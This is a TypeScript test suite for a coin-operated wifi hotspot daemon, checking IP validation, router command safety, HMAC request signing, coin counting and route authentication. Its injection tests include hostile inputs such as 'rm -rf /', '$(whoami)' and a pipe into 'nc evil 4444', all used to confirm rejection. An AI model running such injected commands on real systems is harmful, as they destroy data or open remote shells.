import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import type { AddressInfo } from 'node:net';
import {
  app,
  buildPort80ProxyHeaders,
  decomposePulseCount,
  getCoinStateForTest,
  getShieldAlerts,
  handleIncomingPulse,
  resetCoinStateForTest,
  resolvePin,
  satelliteCoinslots,
  verifySatelliteRequest,
} from '../index.js';
import {
  RouterController,
  isPrivateLanIpv4,
  isValidIpv4,
} from '../services/router-controller.js';

let passed = 0;

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    passed++;
    console.log(`PASS: ${name}`);
  } catch (err) {
    console.error(`FAIL: ${name}`);
    throw err;
  }
}

async function runTests() {
  // 1. IPv4 & injection validation
  await test('isValidIpv4 accepts valid IPv4 and rejects injections / invalid octets', () => {
    assert.equal(isValidIpv4('192.168.1.1'), true);
    assert.equal(isValidIpv4('10.0.0.1'), true);
    assert.equal(isValidIpv4('0.0.0.0'), true);
    assert.equal(isValidIpv4('255.255.255.255'), true);

    assert.equal(isValidIpv4('192.168.1.1; rm -rf /'), false);
    assert.equal(isValidIpv4('192.168.1.1$(whoami)'), false);
    assert.equal(isValidIpv4('192.168.1.1`id`'), false);
    assert.equal(isValidIpv4('192.168.1.1\nid'), false);
    assert.equal(isValidIpv4('256.1.1.1'), false);
    assert.equal(isValidIpv4('192.168.01.1'), false);
    assert.equal(isValidIpv4('192.168.1'), false);
    assert.equal(isValidIpv4('::1'), false);
    assert.equal(isValidIpv4(''), false);
  });

  await test('isPrivateLanIpv4 accepts RFC1918 and rejects loopback/link-local/public', () => {
    assert.equal(isPrivateLanIpv4('10.0.0.50'), true);
    assert.equal(isPrivateLanIpv4('172.16.0.10'), true);
    assert.equal(isPrivateLanIpv4('172.31.255.254'), true);
    assert.equal(isPrivateLanIpv4('192.168.1.88'), true);

    assert.equal(isPrivateLanIpv4('127.0.0.1'), false);
    assert.equal(isPrivateLanIpv4('169.254.169.254'), false);
    assert.equal(isPrivateLanIpv4('8.8.8.8'), false);
    assert.equal(isPrivateLanIpv4('172.32.0.1'), false);
    assert.equal(isPrivateLanIpv4('192.168.1.5/evil'), false);
  });

  await test('RouterController rejects IP/domain shell injections before executeCommand', async () => {
    const rc = new RouterController({ mode: 'fw4_nftables', host: '192.168.1.1' });
    let executed = false;
    rc.executeCommand = async () => {
      executed = true;
      return { stdout: '', stderr: '', code: 0 };
    };

    const authRes = await rc.authorize('aa:bb:cc:dd:ee:ff', 10, '192.168.1.10; rm -rf /');
    assert.equal(authRes.success, false);
    assert.equal(executed, false);

    const wlRes = await rc.addWhitelist('aa:bb:cc:dd:ee:ff', '10.0.0.2$(id)');
    assert.equal(wlRes.success, false);
    assert.equal(executed, false);

    const arpRes = await rc.lookupArp('192.168.1.10`whoami`');
    assert.equal(arpRes, null);
    assert.equal(executed, false);

    const dnsBadDom = await rc.setPortalDns('wifi.local; id', '192.168.1.240');
    assert.equal(dnsBadDom.success, false);
    assert.equal(executed, false);

    const dnsBadIp = await rc.setPortalDns('wifi.local', '192.168.1.240 | nc evil 4444');
    assert.equal(dnsBadIp.success, false);
    assert.equal(executed, false);
  });

  await test('setPortalDns stops adding DHCP options 114/160 and preserves 121/249', async () => {
    const rc = new RouterController({ mode: 'fw4_nftables', host: '192.168.1.1' });
    let capturedCmd = '';
    rc.executeCommand = async (cmd: string) => {
      capturedCmd = cmd;
      return { stdout: 'DNS_OK', stderr: '', code: 0 };
    };

    const res = await rc.setPortalDns('wifi.local', '192.168.1.240');
    assert.equal(res.success, true);
    assert.equal(capturedCmd.includes('add_list dhcp.lan.dhcp_option="114'), false);
    assert.equal(capturedCmd.includes('add_list dhcp.lan.dhcp_option="160'), false);
    assert.equal(capturedCmd.includes('uci -q delete dhcp.lan.dhcp_option\n'), false);
    assert.equal(capturedCmd.includes('del_list dhcp.lan.dhcp_option'), true);
  });

  // 2. Canonical BCM pin mapping
  await test('resolvePin preserves canonical BCM numbers (never remaps BCM 22 -> 25)', () => {
    assert.deepEqual(resolvePin(4), { bcm: 4, physical: 7 });
    assert.deepEqual(resolvePin(17), { bcm: 17, physical: 11 });
    assert.deepEqual(resolvePin(27), { bcm: 27, physical: 13 });
    assert.deepEqual(resolvePin(22), { bcm: 22, physical: 15 });
  });

  // 3. Satellite HMAC verification + replay protection
  await test('verifySatelliteRequest validates HMAC-SHA256, rejects tampering, stale timestamps & nonce replays', () => {
    const secret = 'test-sat-secret-0123456789abcdef';
    const cache = new Map<string, number>();
    const nowMs = 1_750_000_000_000;
    const tsSec = String(Math.floor(nowMs / 1000));
    const nonce = 'nonce-abc-123';
    const rawBody = JSON.stringify({ slotId: 'slot-1', pulses: 5 });
    const sig = crypto
      .createHmac('sha256', secret)
      .update(`${tsSec}:${nonce}:${rawBody}`)
      .digest('hex');

    // Valid request
    const valid = verifySatelliteRequest({
      headers: {
        'x-slot-timestamp': tsSec,
        'x-slot-nonce': nonce,
        'x-slot-signature': sig,
      },
      rawBody,
      secret,
      nowMs,
      nonceCache: cache,
    });
    assert.equal(valid.ok, true);
    assert.equal(valid.mode, 'hmac');

    // Immediate replay with same nonce fails
    const replay = verifySatelliteRequest({
      headers: {
        'x-slot-timestamp': tsSec,
        'x-slot-nonce': nonce,
        'x-slot-signature': sig,
      },
      rawBody,
      secret,
      nowMs: nowMs + 1000,
      nonceCache: cache,
    });
    assert.equal(replay.ok, false);
    assert.equal(replay.error, 'REPLAY_DETECTED');

    // Tampered body fails signature check
    const tamperedSig = verifySatelliteRequest({
      headers: {
        'x-slot-timestamp': tsSec,
        'x-slot-nonce': 'nonce-fresh-1',
        'x-slot-signature': sig,
      },
      rawBody: JSON.stringify({ slotId: 'slot-1', pulses: 500 }),
      secret,
      nowMs,
      nonceCache: cache,
    });
    assert.equal(tamperedSig.ok, false);
    assert.equal(tamperedSig.error, 'INVALID_SIGNATURE');

    // Stale timestamp (> 60s) rejected
    const staleTs = String(Math.floor((nowMs - 65_000) / 1000));
    const staleSig = crypto
      .createHmac('sha256', secret)
      .update(`${staleTs}:nonce-stale:${rawBody}`)
      .digest('hex');
    const stale = verifySatelliteRequest({
      headers: {
        'x-slot-timestamp': staleTs,
        'x-slot-nonce': 'nonce-stale',
        'x-slot-signature': staleSig,
      },
      rawBody,
      secret,
      nowMs,
      nonceCache: cache,
    });
    assert.equal(stale.ok, false);
    assert.equal(stale.error, 'TIMESTAMP_OUT_OF_WINDOW');

    // Query secret rejected
    const queryReject = verifySatelliteRequest({
      headers: { 'x-slot-secret': secret },
      query: { secret },
      rawBody,
      secret,
      nowMs,
      nonceCache: cache,
    });
    assert.equal(queryReject.ok, false);
    assert.equal(queryReject.error, 'QUERY_SECRET_DISABLED');

    // Legacy header accepted when HMAC headers omitted
    const legacy = verifySatelliteRequest({
      headers: { 'x-slot-secret': secret },
      rawBody,
      secret,
      nowMs,
      nonceCache: cache,
    });
    assert.equal(legacy.ok, true);
    assert.equal(legacy.mode, 'legacy_header');
  });

  // 4. decomposePulseCount
  await test('decomposePulseCount decomposes Philippine coin values accurately', () => {
    assert.deepEqual(decomposePulseCount(0), []);
    assert.deepEqual(decomposePulseCount(-3), []);
    assert.deepEqual(decomposePulseCount(1), [1]);
    assert.deepEqual(decomposePulseCount(5), [5]);
    assert.deepEqual(decomposePulseCount(10), [10]);
    assert.deepEqual(decomposePulseCount(20), [20]);
    assert.deepEqual(decomposePulseCount(25), [20, 5]);
    assert.deepEqual(decomposePulseCount(60), [20, 20, 20]);
    assert.deepEqual(decomposePulseCount(68), [20, 20, 20, 5, 1, 1, 1]);
  });

  // 5. Pulse tamper gating & pulseMultiplier
  await test('handleIncomingPulse gates on coinSlotEnabled and triggers coin_tamper alert on >=3 inhibited pulses in 10s', () => {
    resetCoinStateForTest({ enabled: false, pulseMultiplier: 1 });
    const baseTime = 1_750_000_000_000;

    assert.equal(handleIncomingPulse(4, baseTime), false);
    assert.equal(handleIncomingPulse(4, baseTime + 500), false);
    assert.equal(getCoinStateForTest().pendingCoins, 0);
    assert.equal(getShieldAlerts().length, 0);

    // 3rd inhibited pulse within 10s triggers coin_tamper Shield alert
    assert.equal(handleIncomingPulse(4, baseTime + 1200), false);
    assert.equal(getCoinStateForTest().pendingCoins, 0);
    const alerts = getShieldAlerts();
    assert.equal(alerts.length, 1);
    assert.equal(alerts[0]!.type, 'coin_tamper');
    assert.equal(alerts[0]!.severity, 'high');

    // Enabled slot with pulseMultiplier=5 credits 5 pesos per pulse
    resetCoinStateForTest({ enabled: true, pulseMultiplier: 5 });
    assert.equal(handleIncomingPulse(4, baseTime + 2000), true);
    assert.equal(getCoinStateForTest().pendingCoins, 5);
    resetCoinStateForTest();
  });

  // 6. Port 80 proxy header signing
  await test('buildPort80ProxyHeaders overwrites x-real-ip/x-forwarded-for and sets HMAC x-proxy-auth', () => {
    const headers = buildPort80ProxyHeaders(
      { 'x-real-ip': '1.2.3.4', 'x-proxy-auth': 'spoofed' },
      'wifi.local',
      '::ffff:192.168.1.77',
      'daemon-secret-xyz'
    );
    assert.equal(headers['x-real-ip'], '192.168.1.77');
    assert.equal(headers['x-forwarded-for'], '192.168.1.77');
    const expectedHmac = crypto
      .createHmac('sha256', 'daemon-secret-xyz')
      .update('192.168.1.77')
      .digest('hex');
    assert.equal(headers['x-proxy-auth'], expectedHmac);

    const noSecretHeaders = buildPort80ProxyHeaders(
      { 'x-proxy-auth': 'spoofed' },
      'wifi.local',
      '10.0.0.25',
      ''
    );
    assert.equal(noSecretHeaders['x-proxy-auth'], undefined);
  });

  // 7. Express HTTP boundary tests (Control auth, Atomic /api/coins/claim, Satellite isolation, Shield WIDS)
  await test('HTTP routes enforce DAEMON_API_SECRET, atomic claim, satellite isolation & shield WIDS', async () => {
    const prevDaemonSecret = process.env.DAEMON_API_SECRET;
    const prevSatSecret = process.env.SATELLITE_SECRET;
    process.env.DAEMON_API_SECRET = 'test-daemon-secret';
    process.env.SATELLITE_SECRET = 'test-sat-secret';
    satelliteCoinslots.clear();
    resetCoinStateForTest({ enabled: true, pulseMultiplier: 1 });

    const server = await new Promise<ReturnType<typeof app.listen>>((resolve) => {
      const s = app.listen(0, '127.0.0.1', () => resolve(s));
    });

    try {
      const addr = server.address() as AddressInfo;
      const base = `http://127.0.0.1:${addr.port}`;

      // Missing x-daemon-secret -> 401
      const unauth = await fetch(`${base}/api/version`);
      assert.equal(unauth.status, 401);

      // Valid x-daemon-secret -> 200 with open-piso-wifi-daemon package version
      const authVer = await fetch(`${base}/api/version`, {
        headers: { 'x-daemon-secret': 'test-daemon-secret' },
      });
      assert.equal(authVer.status, 200);
      const verJson = (await authVer.json()) as { name: string; version: string };
      assert.equal(verJson.name, 'pisowifi-daemon');
      assert.equal(verJson.version, 'v1.0.6');

      // Satellite registration rejects loopback/public/URL-injection IPs
      const badIpRes = await fetch(`${base}/api/coinslots/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-slot-secret': 'test-sat-secret' },
        body: JSON.stringify({ slotId: 'sat-1', ip: '169.254.169.254' }),
      });
      assert.equal(badIpRes.status, 400);

      // Valid satellite registration returns serverTime
      const regRes = await fetch(`${base}/api/coinslots/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-slot-secret': 'test-sat-secret' },
        body: JSON.stringify({ slotId: 'sat-1', name: 'Slot 1', ip: '192.168.1.50' }),
      });
      assert.equal(regRes.status, 200);
      const regJson = (await regRes.json()) as { success: boolean; serverTime: number };
      assert.equal(regJson.success, true);
      assert.ok(typeof regJson.serverTime === 'number' && regJson.serverTime > 1_700_000_000);

      // Satellite pulse stays isolated from local pendingCoins
      const pulseRes = await fetch(`${base}/api/coinslots/pulse`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-slot-secret': 'test-sat-secret' },
        body: JSON.stringify({ slotId: 'sat-1', pulses: 10 }),
      });
      assert.equal(pulseRes.status, 200);

      const localCoins = (await (
        await fetch(`${base}/api/coins`, { headers: { 'x-daemon-secret': 'test-daemon-secret' } })
      ).json()) as { pulses: number };
      assert.equal(localCoins.pulses, 0);

      const satCoins = (await (
        await fetch(`${base}/api/coins?slotId=sat-1`, { headers: { 'x-daemon-secret': 'test-daemon-secret' } })
      ).json()) as { pulses: number };
      assert.equal(satCoins.pulses, 10);

      // Atomic claim zeroes sat-1 and leaves 0 on subsequent claim
      const claim1 = (await (
        await fetch(`${base}/api/coins/claim`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-daemon-secret': 'test-daemon-secret' },
          body: JSON.stringify({ slotId: 'sat-1' }),
        })
      ).json()) as { success: boolean; pulses: number; coinSlotEnabled: boolean };
      assert.equal(claim1.success, true);
      assert.equal(claim1.pulses, 10);
      assert.equal(claim1.coinSlotEnabled, false);

      const claim2 = (await (
        await fetch(`${base}/api/coins/claim`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-daemon-secret': 'test-daemon-secret' },
          body: JSON.stringify({ slotId: 'sat-1' }),
        })
      ).json()) as { pulses: number };
      assert.equal(claim2.pulses, 0);

      // WIDS event engages Storm Shield and increments deauthStorms count
      const widsRes = (await (
        await fetch(`${base}/api/shield/wids-event`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: 'deauth_storm', severity: 'high', band: '2.4GHz', count: 12 }),
        })
      ).json()) as { success: boolean; stormShieldActive: boolean };
      assert.equal(widsRes.success, true);
      assert.equal(widsRes.stormShieldActive, true);

      const shieldStatus = (await (
        await fetch(`${base}/api/shield/status`, { headers: { 'x-daemon-secret': 'test-daemon-secret' } })
      ).json()) as { stormShieldActive: boolean; counts: { deauthStorms: number; total: number } };
      assert.equal(shieldStatus.stormShieldActive, true);
      assert.equal(shieldStatus.counts.deauthStorms, 1);

      await fetch(`${base}/api/shield/clear-alerts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-daemon-secret': 'test-daemon-secret' },
        body: JSON.stringify({ resetStormShield: true }),
      });
    } finally {
      server.close();
      satelliteCoinslots.clear();
      resetCoinStateForTest();
      if (prevDaemonSecret === undefined) delete process.env.DAEMON_API_SECRET;
      else process.env.DAEMON_API_SECRET = prevDaemonSecret;
      if (prevSatSecret === undefined) delete process.env.SATELLITE_SECRET;
      else process.env.SATELLITE_SECRET = prevSatSecret;
    }
  });

  console.log(`\nAll ${passed} daemon tests passed.`);
}

runTests().catch((err) => {
  console.error(err);
  process.exit(1);
});
